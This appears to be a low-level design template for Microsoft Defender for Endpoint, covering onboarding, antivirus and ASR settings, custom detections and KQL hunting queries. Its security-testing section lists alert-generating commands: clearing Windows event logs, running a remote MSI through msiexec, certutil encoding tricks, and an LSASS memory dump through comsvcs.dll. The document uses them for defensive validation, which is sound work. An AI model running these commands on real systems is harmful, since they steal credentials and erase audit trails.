# Microsoft Defender for Endpoint - Low-Level Design

## Document Information

| Item | Details |
|------|---------|
| **Product** | Microsoft Defender for Endpoint |
| **Document Type** | Low-Level Design |
| **Last Updated** | YYYY-MM-DD |
| **Author** | [Author Name] |
| **Version** | 1.0 |

---

## Purpose

This document provides detailed technical specifications, configurations, and implementation guidance for Microsoft Defender for Endpoint.

## Prerequisites

### Licensing

- [ ] Microsoft Defender for Endpoint Plan 1 or Plan 2 licenses assigned
- [ ] Licenses assigned to target users/devices

### System Requirements

| Platform | Minimum Requirements |
|----------|---------------------|
| Windows 10/11 | Version 1709+ |
| Windows Server | 2012 R2+ with modern unified agent |
| macOS | 11.0 (Big Sur)+ |
| Linux | Kernel 3.10.0+ |
| iOS | 14.0+ |
| Android | 8.0+ |

### Network Requirements

| URL Pattern | Purpose | Port |
|-------------|---------|------|
| `*.wdcp.microsoft.com` | Cloud protection | 443 |
| `*.wd.microsoft.com` | Detection service | 443 |
| `*.smartscreen.microsoft.com` | SmartScreen | 443 |
| `*.blob.core.windows.net` | Updates and data | 443 |
| `crl.microsoft.com` | Certificate validation | 80/443 |

## Configuration Specifications

### 1. Onboarding Configuration

#### Windows Onboarding Methods

| Method | Best For | Tool |
|--------|----------|------|
| Intune | Cloud-managed devices | Microsoft Intune |
| Group Policy | Domain-joined devices | GPMC |
| ConfigMgr | Existing SCCM infrastructure | MECM |
| Local Script | Testing/POC | PowerShell |
| VDI | Virtual desktops | Specialized script |

#### Onboarding Package Deployment (Intune)

```json
{
  "deviceConfiguration": {
    "@odata.type": "#microsoft.graph.windowsDefenderAdvancedThreatProtectionConfiguration",
    "displayName": "MDE Onboarding",
    "description": "Defender for Endpoint onboarding configuration",
    "allowSampleSharing": true,
    "enableExpeditedTelemetryReporting": true
  }
}
```

#### Onboarding Verification

```powershell
# Check onboarding status
Get-MpComputerStatus | Select-Object AMRunningMode, OnboardingState

# Check connectivity
Test-NetConnection -ComputerName "winatp-gw-weu.microsoft.com" -Port 443

# Verify sensor service
Get-Service -Name "Sense"
```

### 2. Next-Generation Protection Configuration

#### Antivirus Policy Settings

| Setting | Recommended Value | Purpose |
|---------|-------------------|---------|
| Real-time Protection | Enabled | Continuous monitoring |
| Cloud-delivered Protection | Enabled | Cloud-based detection |
| Cloud Block Level | High | Aggressive cloud blocking |
| Cloud Block Timeout | 50 seconds | Analysis timeout |
| Submit Samples | Send safe samples | Threat intelligence |
| PUA Protection | Enabled | Block unwanted apps |

#### Intune Antivirus Policy

```json
{
  "settings": {
    "cloudBlockLevel": "high",
    "cloudExtendedTimeout": 50,
    "enableRealTimeMonitoring": true,
    "enableCloudDeliveredProtection": true,
    "submittedSamplesConsent": "sendSafeSamplesAutomatically",
    "puaProtection": "enable"
  }
}
```

### 3. Attack Surface Reduction (ASR) Rules

#### Recommended ASR Rules

| Rule GUID | Rule Name | Mode |
|-----------|-----------|------|
| `BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550` | Block executable content from email | Block |
| `D4F940AB-401B-4EFC-AADC-AD5F3C50688A` | Block Office apps from creating child processes | Block |
| `3B576869-A4EC-4529-8536-B80A7769E899` | Block Office apps from creating executable content | Block |
| `75668C1F-73B5-4CF0-BB93-3ECF5CB7CC84` | Block Office apps from injecting into processes | Block |
| `D3E037E1-3EB8-44C8-A917-57927947596D` | Block JavaScript/VBScript from launching executables | Block |
| `5BEB7EFE-FD9A-4556-801D-275E5FFC04CC` | Block execution of obfuscated scripts | Block |
| `92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B` | Block Win32 API calls from Office macros | Block |
| `01443614-CD74-433A-B99E-2ECDC07BFC25` | Block executable files unless they meet criteria | Audit |
| `C1DB55AB-C21A-4637-BB3F-A12568109D35` | Block untrusted/unsigned processes from USB | Block |
| `9E6C4E1F-7D60-472F-BA1A-A39EF669E4B2` | Block credential stealing from LSASS | Block |
| `D1E49AAC-8F56-4280-B9BA-993A6D77406C` | Block process creations from PSExec/WMI | Block |
| `B2B3F03D-6A65-4F7B-A9C7-1C7EF74A9BA4` | Block persistence through WMI | Block |
| `26190899-1602-49E8-8B27-EB1D0A1CE869` | Block Office communication apps from creating child processes | Block |
| `7674BA52-37EB-4A4F-A9A1-F0F9A1619A2C` | Block Adobe Reader from creating child processes | Block |
| `E6DB77E5-3DF2-4CF1-B95A-636979351E5B` | Block persistence through WMI event subscription | Block |
| `56A863A9-875E-4185-98A7-B882C64B5CE5` | Block abuse of exploited vulnerable signed drivers | Block |

#### ASR Configuration (Intune)

```json
{
  "attackSurfaceReductionRules": [
    {
      "ruleId": "BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550",
      "enabledState": "enabled"
    },
    {
      "ruleId": "D4F940AB-401B-4EFC-AADC-AD5F3C50688A",
      "enabledState": "enabled"
    }
  ]
}
```

### 4. Endpoint Detection and Response (EDR)

#### EDR Settings

| Setting | Value | Purpose |
|---------|-------|---------|
| Sample Collection | Enabled | Forensic analysis |
| Telemetry Level | Full | Complete visibility |
| Live Response | Enabled | Remote investigation |
| Automated Investigation | Semi-automated | Balanced automation |

#### Device Groups Configuration

```
Group: High-Value Assets
├── Automation Level: Semi-automated
├── Members: Tag = "CriticalServer"
└── Remediation Level: Full

Group: Standard Workstations
├── Automation Level: Full
├── Members: DeviceType = "Workstation"
└── Remediation Level: Full

Group: Development Machines
├── Automation Level: No automated response
├── Members: Tag = "Development"
└── Remediation Level: None
```

### 5. Threat & Vulnerability Management

#### TVM Settings

| Setting | Value |
|---------|-------|
| Vulnerability Assessment | Enabled |
| Security Baselines | Microsoft security baselines |
| Remediation Requests | Intune integration |

### 6. Indicators of Compromise (IoC)

#### Indicator Types

| Type | Actions | Use Case |
|------|---------|----------|
| File Hash (SHA-256) | Allow, Block, Audit | Known malware/safe files |
| IP Address | Allow, Block, Audit | C2 servers, safe IPs |
| URL/Domain | Allow, Block, Audit | Malicious/safe sites |
| Certificate | Allow, Block | Trusted/untrusted publishers |

#### Sample IoC Configuration

```json
{
  "indicatorType": "FileSha256",
  "indicatorValue": "SHA256_HASH_HERE",
  "action": "Block",
  "title": "Block known malware",
  "description": "Blocks execution of known malicious file",
  "severity": "High",
  "generateAlert": true
}
```

### 7. Custom Detection Rules

#### Sample Custom Detection

```kusto
// Detect potential credential dumping
DeviceProcessEvents
| where Timestamp > ago(1h)
| where (FileName =~ "mimikatz.exe" or FileName =~ "procdump.exe")
    or (ProcessCommandLine has "sekurlsa" or ProcessCommandLine has "lsadump")
| project Timestamp, DeviceName, FileName, ProcessCommandLine, AccountName, InitiatingProcessFileName
```

### 8. Live Response Configuration

#### Enable Live Response

| Setting | Value |
|---------|-------|
| Live Response | Enabled |
| Live Response for Servers | Enabled |
| Unsigned Script Execution | Disabled (production) |
| File Collection | Enabled |

#### Live Response Commands Reference

| Command | Purpose |
|---------|---------|
| `connections` | List network connections |
| `processes` | List running processes |
| `registry` | Query registry |
| `getfile` | Download file from device |
| `putfile` | Upload file to device |
| `run` | Execute script |
| `remediate` | Remediate detected threat |

## Operational Procedures

### Daily Operations

1. Review device health dashboard
2. Check for new alerts and incidents
3. Monitor onboarding status
4. Review pending remediation actions

### Weekly Operations

1. Review vulnerability reports
2. Analyze security recommendations
3. Update custom detection rules
4. Review ASR rule audit events

### Monthly Operations

1. Review and update device groups
2. Audit indicator lists
3. Review automation levels
4. Generate compliance reports

## Troubleshooting

### Common Issues

| Issue | Cause | Resolution |
|-------|-------|------------|
| Device not onboarding | Network connectivity | Verify URL access |
| Missing telemetry | Sensor not running | Restart Sense service |
| Cloud protection unavailable | Proxy blocking | Configure proxy bypass |
| High CPU usage | Exclusions needed | Add performance exclusions |

### Diagnostic Commands

```powershell
# Check MDE status
Get-MpComputerStatus

# View recent detections
Get-MpThreatDetection

# Check connectivity
& "C:\Program Files\Windows Defender\MpCmdRun.exe" -ValidateMapsConnection

# Collect diagnostic data
& "C:\Program Files\Windows Defender\MpCmdRun.exe" -GetFiles
```

### Log Locations

| Log | Path |
|-----|------|
| Windows Defender | `C:\ProgramData\Microsoft\Windows Defender\Support` |
| Sense (EDR) | `C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\Cyber` |
| Event Logs | `Applications and Services Logs > Microsoft > Windows > Windows Defender` |

## Security Testing

These commands and URLs can be executed/accessed from an endpoint or server with MDE installed to generate alerts. Use these for testing purposes to validate Defender for Endpoint functionality.

### EDR Testing Commands

```powershell
# Clean Windows Event logs (tests EDR reporting capabilities)
wevtutil cl system
wevtutil cl application
wevtutil cl security

# Create a scheduled task (tests behavioral detection)
schtasks /Create /F /SC MINUTE /MO 3 /ST 07:00 /TN CMDTestTask /TR "cmd /c date /T > C:\Windows\Temp\current_date.txt"

# Use of living-off-the-land binary (LOLBAS) - tests msiexec abuse detection
msiexec /q /i https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true

# Encode/Decode with Certutil (tests certutil abuse detection)
copy %windir%\system32\certutil.exe %temp%\tcm.tmp
%temp%\tcm.tmp -encode C:\Windows\System32\calc.exe %temp%\T1140_calc2.txt
%temp%\tcm.tmp -decode %temp%\T1140_calc2.txt %temp%\T1140_calc2_decoded.exe

# Dump LSASS.exe memory using comsvcs.dll (tests credential dumping detection)
# WARNING: This is a sensitive operation - use only in test environments
C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full
```

### Cloud Protection Testing URLs

| Test | URL |
|------|-----|
| Block at First Sight | https://demo.wd.microsoft.com/Page/BAFS |
| Cloud-delivered Protection | https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/defender-endpoint-demonstration-cloud-delivered-protection |
| Network Protection (C2) | `Invoke-WebRequest -URI https://commandcontrol.smartscreentestratings.com` |
| Network Protection | https://smartscreentestratings2.net/ |

## Advanced Hunting KQL Queries

### MDE Tampering Detection

```kusto
// Detect tampering attempts
DeviceEvents
| where ActionType == "TamperingAttempt"
| extend AdditionalInfo = parse_json(AdditionalFields)
| extend Status = AdditionalInfo.['Status']
| extend Target = AdditionalInfo.['Target']

// Count tampering attempts per device
DeviceEvents
| where Timestamp > ago(30d)
| where ActionType == "TamperingAttempt"
| summarize TamperingAttempt = count() by DeviceId, DeviceName

// Tampering with registry value details
DeviceEvents
| where Timestamp > ago(30d)
| where ActionType == "TamperingAttempt"
| summarize Registry_Value = make_list(RegistryValueName) by DeviceId, DeviceName
```

### Defender Antivirus Registry Monitoring

```kusto
// Hunt for registry key activities for Microsoft Defender Antivirus
DeviceRegistryEvents
| where Timestamp > ago(30d)
| where RegistryKey has @"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender"
| project-reorder Timestamp, DeviceId, DeviceName, ActionType, RegistryKey, RegistryValueType, RegistryValueName, RegistryValueData
| sort by Timestamp desc

// Hunt for disabling activities for Defender AV and MDE
DeviceEvents
| where Timestamp > ago(30d)
| where ActionType == "OtherAlertRelatedActivity"
| where AdditionalFields has "net stop Sense" or AdditionalFields has "sc stop Sense" or AdditionalFields has "net stop WinDefend" or AdditionalFields has "sc stop WinDefend"
| extend Command = split(AdditionalFields, 'line')[1]
| project-reorder Timestamp, DeviceId, DeviceName, Command
```

### Attack Surface Reduction Queries

```kusto
// Aggregate ASR events in 1-hour chunks for timeline chart
DeviceEvents
| where ActionType startswith "Asr"
| summarize count() by ActionType, bin(Timestamp, 1h)
| render timechart

// Count ASR events by rule
DeviceEvents
| where ActionType startswith "Asr"
| summarize count() by ActionType
| order by count_ desc

// ASR audit event stats - count events and machines per rule
DeviceEvents
| where ActionType startswith "Asr" and ActionType endswith "Audited"
| summarize EventCount=count(), MachinesCount=dcount(DeviceId) by ActionType

// ASR block stats - count events and machines per rule  
DeviceEvents
| where ActionType startswith "Asr" and ActionType endswith "Blocked"
| summarize EventCount=count(), MachinesCount=dcount(DeviceId) by ActionType
```

### Threat & Vulnerability Management Queries

```kusto
// Count of Known Exploitable Vulnerabilities per Device
let KEV=
externaldata(cveID: string, vendorProject: string, product: string, vulnerabilityName: string, dateAdded: datetime, shortDescription: string, requiredAction: string, dueDate: datetime)
[h@'https://www.cisa.gov/sites/default/files/csv/known_exploited_vulnerabilities.csv']
with(format='csv',ignorefirstrecord=true);
DeviceTvmSoftwareVulnerabilities
| project DeviceName, OSPlatform, cveID=CveId
| join kind=inner KEV on cveID
| summarize ['Vulnerabilities']=make_set(cveID) by DeviceName
| extend ['Count of Known Exploited Vulnerabilities'] = array_length(['Vulnerabilities'])
| sort by ['Count of Known Exploited Vulnerabilities']

// Overall Device Posture
DeviceTvmSecureConfigurationAssessment
| where ConfigurationId in ('scid-91', 'scid-2000', 'scid-2001', 'scid-2002', 'scid-2003', 'scid-2010', 'scid-2011', 'scid-2012', 'scid-2013', 'scid-2014', 'scid-2016', 'scid-96', 'scid-2090')
| summarize arg_max(Timestamp, IsCompliant, IsApplicable) by DeviceName, ConfigurationId
| extend Test = case(
    ConfigurationId == "scid-2090", "BitLockerEnabled",
    ConfigurationId == "scid-2000", "SensorEnabled",
    ConfigurationId == "scid-2001", "SensorDataCollection",
    ConfigurationId == "scid-2002", "ImpairedCommunications",
    ConfigurationId == "scid-2003", "TamperProtection",
    ConfigurationId == "scid-2010", "AntivirusEnabled",
    ConfigurationId == "scid-2011", "AntivirusSignatureVersion",
    ConfigurationId == "scid-2012", "RealtimeProtection",
    ConfigurationId == "scid-91", "BehaviorMonitoring",
    ConfigurationId == "scid-2013", "PUAProtection",
    ConfigurationId == "scid-2014", "AntivirusReporting",
    ConfigurationId == "scid-2016", "CloudProtection",
    ConfigurationId == "scid-96", "NetworkProtection",
    "N/A"),
Result = case(IsApplicable == 0, "N/A", IsCompliant == 1, "Compliant", "Non Compliant")
| extend packed = pack(Test, Result)
| summarize Tests = make_bag(packed) by DeviceName
| evaluate bag_unpack(Tests)
```

### Daily Alert Summary

```kusto
// Daily alert & severity for MDE/AV
AlertInfo
| where Timestamp > ago(30d)
| where ServiceSource == "Microsoft Defender for Endpoint"
| summarize AlertNum = count() by Severity, bin(Timestamp, 1d)
| render timechart
```

## Related Documentation

- [Overview](01-Overview.md)
- [High-Level Design](02-High-Level-Design.md)
- [Capabilities](04-Capabilities.md)
- [Device Onboarding Process](../Processes/Device-Onboarding.md)
- [Incident Response Process](../Processes/Incident-Response.md)

---

## Document Control

| Version | Date | Author | Changes |
|---------|------|--------|---------|
| 1.0 | YYYY-MM-DD | [Author] | Initial creation |
